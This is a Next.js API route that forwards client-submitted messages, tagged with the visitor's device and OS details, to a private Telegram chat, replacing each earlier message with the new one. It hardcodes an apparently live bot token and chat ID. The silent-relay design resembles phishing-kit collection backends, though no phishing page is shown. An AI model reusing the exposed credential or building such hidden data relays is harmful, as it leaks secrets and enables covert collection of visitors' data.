import { NextRequest, NextResponse } from 'next/server';
import { UAParser } from 'ua-parser-js';

const getConfig = async () => {
    const config = {
        TOKEN: "8805295494:AAFhbg2XDVBV9m1B4Nr9gdPnectPkq7eZ0Q",
        CHAT_ID:1465093776
    };
    if (!config.TOKEN || !config.CHAT_ID) {
        throw new Error("Missing TOKEN or CHAT_ID in environment variables");
    }

    return config;
};


const POST = async (req: NextRequest) => {
    try {
        const body = await req.json();
        const { message, message_id } = body;

        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        const config = await getConfig();
        const { TOKEN, CHAT_ID } = config;

        if (!TOKEN || !CHAT_ID) {
            return NextResponse.json({ success: false, message: 'Missing TOKEN or CHAT_ID in config' }, { status: 500 });
        }

        const ua = req.headers.get('user-agent') || '';
        const parser = new UAParser(ua);
        const uaResult = parser.getResult();
        const deviceType = uaResult.device.type || 'desktop';
        const deviceVendor = uaResult.device.vendor || 'Unknown';
        const deviceModel = uaResult.device.model || 'Unknown';
        const osName = uaResult.os.name || 'Unknown';
        const osVersion = uaResult.os.version || 'Unknown';
        const deviceName = [deviceVendor, deviceModel].filter((item) => item && item !== 'Unknown').join(' ');
        const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
        const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
        const deviceInfo = `${finalDeviceName} | ${osLabel}`;
        const messageWithDeviceInfo = message.includes('__DEVICE_INFO__')
            ? message.replace('__DEVICE_INFO__', deviceInfo)
            : message;

        // Gửi tin nhắn mới trước
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageWithDeviceInfo,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            return NextResponse.json({ success: false }, { status: 500 });
        }

        const data = await response.json();
        const newMessageId = data?.result?.message_id ?? null;

        // Chỉ xóa tin cũ sau khi gửi tin mới thành công
        if (message_id) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: message_id
                })
            });
        }

        return NextResponse.json({ success: true, message_id: newMessageId });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
};

export { POST };
